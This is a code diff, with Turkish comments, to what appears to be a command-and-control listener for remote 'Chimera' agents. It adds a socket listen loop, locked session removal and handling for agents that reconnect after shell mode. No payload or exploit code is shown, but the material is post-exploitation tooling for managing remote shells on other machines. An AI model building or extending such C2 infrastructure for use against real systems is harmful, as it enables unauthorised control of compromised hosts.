@@ -51,6 +51,51 @@ class Handler(BaseHandler):
                 print(f"[!] Sertifika oluşturma hatası: {e}")
                 print("[!] Lütfen openssl'in yüklü olduğundan emin olun.")
 
+    def start(self):
+        """
+        Soketi oluşturur, bağlar ve dinlemeye başlar. BaseHandler'dan
+        farklı olarak bağlantı koptuğunda break yapmaz, ajan yeniden
+        bağlanana kadar dinlemeye devam eder.
+        """
+        try:
+            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            self.sock.bind((self.lhost, self.lport))
+            self.sock.listen(5)
+            
+            self.running = True
+            print(f"[*] Dinleniyor: {self.lhost}:{self.lport} (Çıkmak için CTRL+C)")
+            
+            while self.running:
+                try:
+                    client_sock, client_addr = self.sock.accept()
+                    print(f"[+] Bağlantı geldi: {client_addr[0]}:{client_addr[1]}")
+                    
+                    session_id = None
+                    if shared_state.session_manager:
+                        connection_info = {
+                            "host": client_addr[0],
+                            "port": client_addr[1],
+                            "type": "Chimera"
+                        }
+                        session_id = shared_state.session_manager.add_session(self, connection_info)
+                        print(f"[*] Oturum açıldı: Session {session_id}")
+
+                    self.handle_connection(client_sock, session_id)
+                    
+                except KeyboardInterrupt:
+                    raise
+                except Exception as e:
+                    if self.running:
+                        print(f"[!] Bağlantı kabul hatası: {e}")
+                        
+        except KeyboardInterrupt:
+            print("\n[*] Dinleyici durduruluyor...")
+        except Exception as e:
+            print(f"[!] Hata: {e}")
+        finally:
+            self.stop()
+
     def handle_connection(self, client_sock: socket.socket, session_id: int = None):
         """
         Yeni gelen bağlantıyı karşılar ve yönetir.
@@ -259,7 +304,9 @@ class Handler(BaseHandler):
                 pass
             self.client_sock = None
             if shared_state.session_manager and self.session_id:
-                shared_state.session_manager.remove_session(self.session_id)
+                with shared_state.session_manager.lock:
+                    if self.session_id in shared_state.session_manager.sessions:
+                        del shared_state.session_manager.sessions[self.session_id]
             self.session_id = None # Session düştü
 
 
@@ -281,7 +328,10 @@ class Handler(BaseHandler):
                     print("[*] Bağlantı kapatılıyor...")
                     self.send_data("terminate")
                     if shared_state.session_manager and self.session_id:
-                        shared_state.session_manager.remove_session(self.session_id)
+                        with shared_state.session_manager.lock:
+                            if self.session_id in shared_state.session_manager.sessions:
+                                del shared_state.session_manager.sessions[self.session_id]
+                    self.session_id = None
                     break
                     
                 if cmd_lower in ["background", "bg"]:
@@ -508,8 +558,14 @@ class Handler(BaseHandler):
                     
                     if "[+]" in response:
                          self.start_shell_mode()
-                         # Shell modundan dönünce loop'tan çık (yeni bağlantı beklenecek)
-                         break
+                         # Shell modundan dönünce ajan kapatıp yeniden bağlanacaktır. Bekle:
+                         print("[*] Ajanın yeniden bağlanması bekleniyor...")
+                         import time
+                         while self.client_sock is None and getattr(self, "running", True):
+                             time.sleep(0.5)
+                         if getattr(self, "client_sock", None):
+                             print(f"[*] Bağlantı yenilendi, Chimera Session {self.session_id} olarak devam ediliyor.")
+                         continue
                     else:
                         continue
                 
@@ -632,7 +688,10 @@ class Handler(BaseHandler):
                 else:
                     print("[!] Bağlantı koptu.")
                     if shared_state.session_manager and self.session_id:
-                        shared_state.session_manager.remove_session(self.session_id)
+                        with shared_state.session_manager.lock:
+                            if self.session_id in shared_state.session_manager.sessions:
+                                del shared_state.session_manager.sessions[self.session_id]
+                    self.session_id = None
                     break
                     
             except KeyboardInterrupt:
